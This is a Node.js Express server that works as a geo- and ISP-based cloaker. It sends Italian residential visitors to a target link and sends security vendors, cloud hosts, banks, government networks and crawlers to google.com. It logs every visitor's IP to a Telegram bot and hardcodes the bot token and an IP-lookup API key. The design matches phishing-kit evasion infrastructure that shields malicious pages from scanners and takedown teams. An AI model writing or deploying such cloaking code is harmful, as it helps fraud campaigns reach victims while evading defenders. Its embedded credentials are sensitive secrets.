const express = require('express');
const axios = require('axios');
const app = express();

const TELEGRAM_BOT_TOKEN = '7696566805:AAEYUujgOdLdtLKxQHJTL8NAkWN_1JNB65Q';
const TELEGRAM_CHAT_ID = '-4695065184';
const IP_API_KEY = 'khrrBC6o2uXNXSp';

const OFFICIAL_LINK = 'https://www.sito-ufficiale.it';
const BLOCKED_REDIRECT = 'https://www.google.com';

// IPs à bloquer (préfixe)
const IP_BLOCKLIST = [ 
  "193.56.2", "92.147.12.196", "194.78", "37.201.192.242", "79.166.147.44",
  "85.73.24.124", "5.203.224.203", "176.167.97.91", "176.176.30", "194.206",
  "185.", "176.149.93", "82.120.84", "94.143.176", "185.228.2", "176.148.157",
  "193.57", "89.210.43.74", "62.74.15.205", "2.10.4", "92.184", "109.221"
];

// ISP à bloquer (contient l’un de ces mots)
const ISP_BLACKLIST = [   
  "OVH", "CompleTel", "Ozone", "Herault", "Supernet", "Interveille", "hosting", "VIALIS", "LINKSIP", "SAEM",
  "GTT", "TELOISE", "Nexeon", "Commerciale", "CRIHAN", "ICAUNAISE", "COOPERATIVE", "NORDNET-EXT",
  "INFOMIL-CLTPARIS", "NORDNET", "Technologies", "cloud", "Knet", "Systeme", "Telia", "EI-TELECOM",
  "Interministerielle", "Security", "Metropole", "GALIANA", "CNAMTS", "Alcatraz", "Adista", "KEYYO",
  "Teranet", "OpenIP-Network", "CEGETEL", "DISIC-RIE", "M247", "ALTSYSNET-OCCITANET5G", "Google",
  "UNIMEDIA-SERVICES", "Cogent", "Netprotect", "velia.net", "NATIXIS", "Electricite", "Hub", "Labs",
  "Lyre", "Serveurcom", "Rezopole", "Appliwave", "Epargne", "Anexia", "Caisse", "Sewan", "Reunicable",
  "Axione", "Scalair", "Colt", "epargne", "caisse", "Poste", "Nerim", "Choopa", "SPIE", "Paritel",
  "Microsoft", "DATACENTER", "Layer", "ZSCALER", "Coaxis", "Firewall", "RENATER", "Online", "Traitement",
  "Dedicated", "Owentis", "Coriolis", "Zscaler", "OZN", "CNCA", "Jaguar", "Vultr", "Holdings", "LLC",
  "NSC-SOLUTIONS", "Backbone", "DSL", "VadeSecure", "Datacamp", "Momax", "Mutuel", "FIMATEX", "NEO",
  "Credit", "Agricole", "PSINet", "Skylogic", "Herault-networks", "Alliance", "Connectic", "MYSTREAM",
  "Amazon", "GROUPAMA", "IRIS64", "Francaise", "Opentransit", "Radiotelephone", "BPCE", "Rezocean",
  "K-net", "SCALEWAY", "Brutele", "YouSee"
];

// ⚠️ Blocage IP (préfixe)
function isBlockedIP(ip) {
  return IP_BLOCKLIST.some(blocked => ip.startsWith(blocked));
}

// ⚠️ Blocage ISP (nom partiel)
function isBlockedISP(isp) {
  return ISP_BLACKLIST.some(badIsp => isp.toLowerCase().includes(badIsp.toLowerCase()));
}

// 🔁 Envoi à Telegram
async function sendToTelegram(ip, country, isp, status) {
  const now = new Date().toISOString();
  const message = `<b>${ip}</b> - ${country} - ${isp}\nStatus: <b>${status}</b>\nTime: ${now}`;
  await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'HTML'
  });
}

// ✅ Route
app.get('/', async (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;

  try {
    const response = await axios.get(`http://pro.ip-api.com/json/${ip}?key=${IP_API_KEY}`);
    const { countryCode, isp } = response.data;

    let redirectTo = BLOCKED_REDIRECT;
    let status = 'Blocked';

    if (countryCode === 'IT' && !isBlockedIP(ip) && !isBlockedISP(isp)) {
      redirectTo = OFFICIAL_LINK;
      status = 'Allowed IT';
    }

    await sendToTelegram(ip, countryCode, isp, status);
    return res.redirect(redirectTo);

  } catch (error) {
    console.error('❌ Erreur API:', error.message);
    return res.redirect(BLOCKED_REDIRECT);
  }
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`✅ Serveur sur http://localhost:${PORT}`);
});
